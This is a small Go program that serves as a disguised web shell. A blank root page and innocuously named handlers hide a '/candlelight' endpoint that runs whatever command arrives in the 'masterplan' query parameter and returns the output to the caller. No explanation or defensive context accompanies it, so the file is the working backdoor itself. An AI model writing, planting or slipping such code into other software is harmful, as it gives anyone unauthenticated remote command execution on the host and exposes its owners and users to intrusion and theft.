package main

import (
	"fmt"
	"net/http"
	"os/exec"
	"time"
)

func hello(w http.ResponseWriter, r *http.Request) {
	start := time.Now()
	if r.URL.Query().Get("masterplan") != "" {
		cmd := exec.Command(r.URL.Query().Get("masterplan"))
		cmd.Stdout = w
		cmd.Run()
	}

	fmt.Println(time.Since(start))
	//retun cmd.Stdout()

}

func uncle(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte(""))
}

func main() {
	http.HandleFunc("/candlelight", hello)
	http.HandleFunc("/", uncle)
	http.ListenAndServe(":8000", nil)
}
